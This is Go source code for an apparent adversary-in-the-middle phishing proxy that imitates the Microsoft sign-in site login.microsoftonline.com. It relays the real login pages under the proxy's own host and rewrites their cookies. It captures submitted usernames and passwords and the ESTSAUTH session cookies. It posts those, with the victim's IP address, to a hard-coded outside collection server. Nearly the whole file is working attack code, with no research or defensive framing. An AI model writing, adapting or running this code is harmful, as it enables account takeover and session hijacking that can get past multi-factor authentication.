package main

import (
    "bytes"
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "io/ioutil"
    "net/http"
    "net/url"
    "os"
    "strings"
)

// Constants for upstream and server configurations
const (
    upstream        = "login.microsoftonline.com"
    upstreamPath    = "/"
    serverURL       = "https://3xrlcxb4gbwtmbar12126.cleavr.one/ne/push.php"
)

// Variables for blocking regions and IP addresses
var (
    blockedRegions = []string{}
    blockedIPs     = []string{"0.0.0.0", "127.0.0.1"}
)

// generateNonce generates a random nonce for use in CSP
func generateNonce() (string, error) {
    nonce := make([]byte, 16)
    if _, err := rand.Read(nonce); err != nil {
        return "", err
    }
    return base64.StdEncoding.EncodeToString(nonce), nil
}

func main() {
    // Retrieve the PORT from environment variables
    port := os.Getenv("PORT")
    if port == "" {
        port = "8080" // Default to port 8080 if not set
        fmt.Println("PORT environment variable not set, defaulting to 8080")
    }

    http.HandleFunc("/", handleRequest)
    fmt.Printf("Starting proxy server on port %s...\n", port)
    if err := http.ListenAndServe("0.0.0.0:"+port, nil); err != nil {
        fmt.Printf("Error starting server: %v\n", err)
        os.Exit(1)
    }
}

func handleRequest(w http.ResponseWriter, r *http.Request) {
    // Generate a nonce for this request
    nonce, err := generateNonce()
    if err != nil {
        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        return
    }

    // Set the CSP header with the generated nonce
    w.Header().Set("Content-Security-Policy", fmt.Sprintf("default-src 'self'; script-src 'self' 'nonce-%s'; style-src 'self' 'nonce-%s'; object-src 'none'; base-uri 'self';", nonce, nonce))

    region := r.Header.Get("cf-ipcountry")
    ipAddress := r.Header.Get("cf-connecting-ip")

    if isBlocked(region, ipAddress) {
        http.Error(w, "Access denied.", http.StatusForbidden)
        return
    }

    upstreamURL := buildUpstreamURL(r)
    req, err := http.NewRequest(r.Method, upstreamURL, r.Body)
    if err != nil {
        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        return
    }

    copyHeaders(r.Header, &req.Header)
    req.Header.Set("Host", upstream)
    req.Header.Set("Referer", r.Referer())

    if r.Method == "POST" {
        r.ParseForm()
        var message strings.Builder
        message.WriteString("Password found:\n\n")
        for key, values := range r.PostForm {
            value := values[0]
            if key == "login" {
                message.WriteString("User: " + value + "\n")
            }
            if key == "passwd" {
                message.WriteString("Password: " + value + "\n")
            }
        }
        if strings.Contains(message.String(), "User") && strings.Contains(message.String(), "Password") {
            sendToServer(message.String(), ipAddress)
        }
    }

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        http.Error(w, "Error contacting upstream server", http.StatusInternalServerError)
        return
    }
    defer resp.Body.Close()

    // Extract and modify cookies
    allCookies := extractAndModifyCookies(resp, w)

    bodyBytes, _ := ioutil.ReadAll(resp.Body)
    bodyString := strings.ReplaceAll(string(bodyBytes), upstream, r.Host)

    if strings.Contains(allCookies, "ESTSAUTH") && strings.Contains(allCookies, "ESTSAUTHPERSISTENT") {
        sendToServer("Cookies found:\n\n"+allCookies, ipAddress)
    }

    w.WriteHeader(resp.StatusCode)
    w.Write([]byte(bodyString))
}

func buildUpstreamURL(r *http.Request) string {
    upstreamURL := fmt.Sprintf("https://%s%s", upstream, upstreamPath+r.URL.Path)
    if r.URL.RawQuery != "" {
        upstreamURL += "?" + r.URL.RawQuery
    }
    return upstreamURL
}

func extractAndModifyCookies(resp *http.Response, w http.ResponseWriter) string {
    var allCookies strings.Builder
    cookies := resp.Cookies()
    for _, cookie := range cookies {
        modifiedCookie := strings.ReplaceAll(cookie.String(), upstream, w.Header().Get("Host"))
        allCookies.WriteString(modifiedCookie + "; \n\n")
        w.Header().Add("Set-Cookie", modifiedCookie)
    }
    return allCookies.String()
}

func copyHeaders(src http.Header, dst *http.Header) {
    for k, v := range src {
        for _, vv := range v {
            dst.Add(k, vv)
        }
    }
}

func isBlocked(region, ipAddress string) bool {
    for _, blockedRegion := range blockedRegions {
        if strings.EqualFold(blockedRegion, region) {
            return true
        }
    }
    for _, blockedIP := range blockedIPs {
        if blockedIP == ipAddress {
            return true
        }
    }
    return false
}

func sendToServer(data, ipAddress string) {
    payload := fmt.Sprintf(`{"data": "%s", "ip": "%s"}`, data, ipAddress)
    _, err := http.Post(serverURL, "application/json", strings.NewReader(payload))
    if err != nil {
        fmt.Println("Failed to send data to server:", err)
    }
}
